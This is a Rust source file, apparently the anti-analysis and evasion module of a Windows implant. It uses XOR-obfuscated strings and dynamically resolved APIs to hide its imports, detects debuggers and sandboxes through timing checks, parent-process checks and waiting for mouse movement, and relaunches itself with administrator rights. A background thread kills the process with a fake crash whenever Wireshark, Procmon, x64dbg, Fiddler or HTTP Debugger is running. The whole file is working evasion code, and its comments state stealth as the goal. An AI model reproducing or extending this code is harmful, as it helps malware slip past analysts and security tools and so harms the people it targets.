use std::time::Duration;
use windows::Win32::System::SystemInformation::GetTickCount64;
use windows::Win32::UI::WindowsAndMessaging::GetCursorPos;
use windows::Win32::Foundation::{POINT, HWND};
use windows::Win32::System::Diagnostics::ToolHelp::{PROCESSENTRY32, TH32CS_SNAPPROCESS};
use windows::Win32::UI::Shell::ShellExecuteA;
use windows::core::PCSTR;
use windows::Win32::System::Threading::{OpenProcessToken, GetCurrentProcess, WaitForSingleObject};
use windows::Win32::Security::{GetTokenInformation, TokenElevation, TOKEN_QUERY, TOKEN_ELEVATION};
use std::ffi::c_void;

use crate::dynamo;
use crate::dark_matter;
use windows::Win32::Foundation::BOOL;



/// Smart Sleep using WaitForSingleObject to evade sandbox sleep-skipping.
/// We wait on our own process handle (which is non-signaled until exit) with a timeout.
pub fn smart_sleep(ms: u32) {
    unsafe {
        let _ = WaitForSingleObject(GetCurrentProcess(), ms);
    }
}

/// Validates that the process was spawned by a trusted parent (Explorer, CMD, PowerShell).
/// If spawned by a debugger or unknown tool, returns false.
pub fn is_safe_parent() -> bool {
    unsafe {
        // 1. Get My PID
        let my_pid = windows::Win32::System::Threading::GetCurrentProcessId();
        
        // 2. Resolve APIs (Dynamo) / or use ToolHelp structs since we have them
        // For parent check, we'll use direct calls or dynamo. Since IAT Camouflage is for *Hunter* checks,
        // using standard API here for logic flow is technically visible, but "CreateToolhelp32Snapshot" is common.
        // However, to stick to v11 "Stealth", let's use Dynamo if possible, but we need the Struct definitions.
        // The structs (PROCESSENTRY32) are imported.
        
        // We'll re-use the dynamo logic for consistency.
        // Use Dark Strings
        let k32 = dark_matter::decrypt(dark_matter::KERNEL32);
        let snap = dark_matter::decrypt(dark_matter::SNAPSHOT);
        let p1 = dark_matter::decrypt(dark_matter::PROC_FIRST);
        let px = dark_matter::decrypt(dark_matter::PROC_NEXT);

        let create_snapshot: extern "system" fn(u32, u32) -> windows::Win32::Foundation::HANDLE;
        let process_first: extern "system" fn(windows::Win32::Foundation::HANDLE, *mut PROCESSENTRY32) -> BOOL;
        let process_next: extern "system" fn(windows::Win32::Foundation::HANDLE, *mut PROCESSENTRY32) -> BOOL;

        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &snap) {
             create_snapshot = std::mem::transmute(addr);
        } else { return true; } 

        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &p1) {
             process_first = std::mem::transmute(addr);
        } else { return true; }
        
        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &px) {
             process_next = std::mem::transmute(addr);
        } else { return true; }

        // 3. Find Parent PID
        let h_snap = create_snapshot(TH32CS_SNAPPROCESS.0, 0);
        if h_snap.is_invalid() { return true; }

        let mut pe = PROCESSENTRY32::default();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        let mut ppid = 0;
        if process_first(h_snap, &mut pe).as_bool() {
            loop {
                if pe.th32ProcessID == my_pid {
                    ppid = pe.th32ParentProcessID;
                    break;
                }
                if !process_next(h_snap, &mut pe).as_bool() { break; }
            }
        }
        
        if ppid == 0 { return true; } // Couldn't find self?

        // 4. Find Parent Name
        // Rewind? dynamic Process32First acts as rewind usually if we call it again?
        // Actually, easiest is to close and reopen snapshot or just use the same one if generic.
        // But `Process32First` on same handle resets it.
        // Let's safe-bet: use `process_first` again.
        
        let mut parent_name = String::new();
        if process_first(h_snap, &mut pe).as_bool() {
            loop {
                if pe.th32ProcessID == ppid {
                    parent_name = std::ffi::CStr::from_ptr(pe.szExeFile.as_ptr() as *const i8)
                        .to_string_lossy()
                        .to_lowercase();
                    break;
                }
                if !process_next(h_snap, &mut pe).as_bool() { break; }
            }
        }
        let _ = windows::Win32::Foundation::CloseHandle(h_snap);

        // 5. Validate
        // Validate with Dark Strings
        let explorer = dark_matter::decrypt(dark_matter::EXPLORER);
        let cmd = dark_matter::decrypt(dark_matter::CMD);
        let pws = dark_matter::decrypt(dark_matter::POWERSHELL);
        let services = dark_matter::decrypt(dark_matter::SERVICES);
        let python = dark_matter::decrypt(dark_matter::PYTHON);

        if parent_name.contains(&explorer) || 
           parent_name.contains(&cmd) || 
           parent_name.contains(&pws) ||
           parent_name.contains(&services) {
            return true;
        }

        if parent_name.contains(&python) { return true; }

        false
    }
}

/// Checks for debuggers using Dynamic API Resolution (IAT Camouflage)
pub fn check_debugger() -> bool {
    unsafe {
        // Kernel32.dll -> IsDebuggerPresent
        // We use a XOR-encoded string for "IsDebuggerPresent" if we want extra stealth,
        // but for now, just pulling it out of IAT is a huge win.
        let k32 = dark_matter::decrypt(dark_matter::KERNEL32);
        let is_dbg = dark_matter::decrypt(dark_matter::IS_DEBUGGER);
        
        if let Some(func_addr) = dynamo::Dynamo::get_func(&k32, &is_dbg) {
            let func: extern "system" fn() -> BOOL = std::mem::transmute(func_addr);
            return func().as_bool();
        }
    }
    false
}

/// Detects "Time-Warping" sandboxes
pub fn detect_time_warping() -> bool {
    unsafe {
        let start = GetTickCount64();
        std::thread::sleep(Duration::from_millis(2000));
        let end = GetTickCount64();
        if end - start < 1500 { return true; }
    }
    false
}

/// Waits for mouse movement
pub fn verify_human_presence() {
    unsafe {
        let mut start_pos = POINT::default();
        let _ = GetCursorPos(&mut start_pos);
        let threshold = 50;
        let mut checks = 0;
        loop {
            let mut current_pos = POINT::default();
            let _ = GetCursorPos(&mut current_pos);
            let dx = (current_pos.x - start_pos.x).abs();
            let dy = (current_pos.y - start_pos.y).abs();
            if dx > threshold || dy > threshold { break; }
            smart_sleep(100);
            checks += 1;
            if checks > 100 { break; } // Evasion: Don't wait forever
        }
    }
}

/// Checks if the current process has Administrator privileges
pub fn am_i_admin() -> bool {
    unsafe {
        let mut token_handle = windows::Win32::Foundation::HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle).is_ok() {
            let mut elevation = TOKEN_ELEVATION::default();
            let mut size = 0;
            if GetTokenInformation(token_handle, TokenElevation, Some(&mut elevation as *mut _ as *mut c_void), std::mem::size_of::<TOKEN_ELEVATION>() as u32, &mut size).is_ok() {
                return elevation.TokenIsElevated != 0;
            }
        }
    }
    false
}

/// Relaunches the application with Administrator privileges
pub fn elevate_self() {
    unsafe {
        use std::ffi::CString;
        if let Ok(exe_path) = std::env::current_exe() {
            let exe_str = CString::new(exe_path.to_string_lossy().as_bytes()).unwrap();
            let verb_str = dark_matter::decrypt(dark_matter::RUNAS);
            let verb = CString::new(verb_str).unwrap();
            
            ShellExecuteA(
                HWND::default(),
                PCSTR(verb.as_ptr() as *const u8),
                PCSTR(exe_str.as_ptr() as *const u8),
                PCSTR(std::ptr::null()),
                PCSTR(std::ptr::null()),
                windows::Win32::UI::WindowsAndMessaging::SW_SHOWNORMAL
            );
        }
        std::process::exit(0);
    }
}

use crate::obfuscation;

// XOR Key: 0x55
const WIRESHARK_BYTES: &[u8] = &[34, 60, 39, 48, 38, 61, 52, 39, 62];
const PROCMON_BYTES: &[u8] = &[37, 39, 58, 54, 56, 58, 59];
const X64DBG_BYTES: &[u8] = &[45, 99, 97, 49, 55, 50];
const FIDDLER_BYTES: &[u8] = &[51, 60, 49, 49, 57, 48, 39];
const HTTPDEBUGGER_BYTES: &[u8] = &[61, 33, 33, 37, 49, 48, 55, 32, 50, 50, 48, 39];


/// Scans for "Hunter" processes using Obfuscated Strings & Dynamic API
pub fn check_hunter_processes() -> bool {
    unsafe {
        // Dynamic Resolution of ToolHelp APIs
        // CreateToolhelp32Snapshot
        let create_snapshot: extern "system" fn(u32, u32) -> windows::Win32::Foundation::HANDLE;
        // Process32First
        let process_first: extern "system" fn(windows::Win32::Foundation::HANDLE, *mut PROCESSENTRY32) -> BOOL;
        // Process32Next
        let process_next: extern "system" fn(windows::Win32::Foundation::HANDLE, *mut PROCESSENTRY32) -> BOOL;

        // Use Dark Matter for Dynamic Resolution strings too
        let k32 = dark_matter::decrypt(dark_matter::KERNEL32);
        let snap = dark_matter::decrypt(dark_matter::SNAPSHOT);
        let p1 = dark_matter::decrypt(dark_matter::PROC_FIRST);
        let px = dark_matter::decrypt(dark_matter::PROC_NEXT);

        // Resolve Pointers
        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &snap) {
             create_snapshot = std::mem::transmute(addr);
        } else { return false; }

        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &p1) {
             process_first = std::mem::transmute(addr);
        } else { return false; }
        
        if let Some(addr) = dynamo::Dynamo::get_func(&k32, &px) {
             process_next = std::mem::transmute(addr);
        } else { return false; }

        // Execution
        let snapshot = create_snapshot(TH32CS_SNAPPROCESS.0, 0);
        if snapshot.is_invalid() { return false; }

        let mut entry = PROCESSENTRY32::default();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        let key = 0x55;
        let wireshark = obfuscation::decode(WIRESHARK_BYTES, key);
        let procmon = obfuscation::decode(PROCMON_BYTES, key);
        let x64dbg = obfuscation::decode(X64DBG_BYTES, key);
        let fiddler = obfuscation::decode(FIDDLER_BYTES, key);
        let httpdebugger = obfuscation::decode(HTTPDEBUGGER_BYTES, key);
        
        if process_first(snapshot, &mut entry).as_bool() {
            loop {
                // Convert to lowercase String for comparison
                let name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8)
                    .to_string_lossy()
                    .to_lowercase();
                
                // Compare against decoded strings
                if name.contains(&wireshark) || 
                   name.contains(&procmon) || 
                   name.contains(&x64dbg) || 
                   name.contains(&fiddler) ||
                   name.contains(&httpdebugger) {
                    return true; // Hunter Found
                }

                if !process_next(snapshot, &mut entry).as_bool() { break; }
            }
        }
    }
    false
}

/// Simulation of a VCRUNTIME140.dll missing error
pub fn crash_dummy() {
    // Just exit cleanly. 
    std::process::exit(0);
}

/// Spawns a background thread that continuously checks for Hunter processes.
/// If found, it triggers the Fake Error immediately.
pub fn start_shadow_watcher() {
    std::thread::spawn(|| {
        loop {
            if check_hunter_processes() {
                crash_dummy();
            }
            // Check every 500ms. Frequent enough to catch them starting, 
            // sparse enough to use 0% CPU.
            std::thread::sleep(Duration::from_millis(500));
        }
    });
}
